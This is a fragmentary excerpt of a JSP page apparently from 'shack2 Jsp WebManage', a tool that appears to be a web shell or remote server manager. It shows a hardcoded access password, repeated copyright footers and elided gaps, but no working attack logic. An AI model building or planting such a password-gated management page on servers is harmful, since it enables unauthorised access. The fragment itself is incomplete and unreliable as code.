...
<%!
private static final String PASS = "asdasd123";//password
...
<div style="border-bottom:2px #ccc solid;">Copyright (c) 2014 <a href="http://www.xxx.org">http://www.xxx.org</a> All Rights Reserved| coded by shack2 QQ：2415| power by shack2 Jsp WebManage| version:<%=VERSION%></div>
</body>
</html><%
	}
...
<div>
	...
	<!--内容结束-->
	<div class="bottom">Copyright (c) 2014 <a href="http://www.xxx.org">http://www.xxx.org</a> All Rights Reserved| coded by shack2 QQ：1413415| power by shack2 Jsp WebManage| version:<%=VERSION%></div>
</div>
<script type="text/javascript">
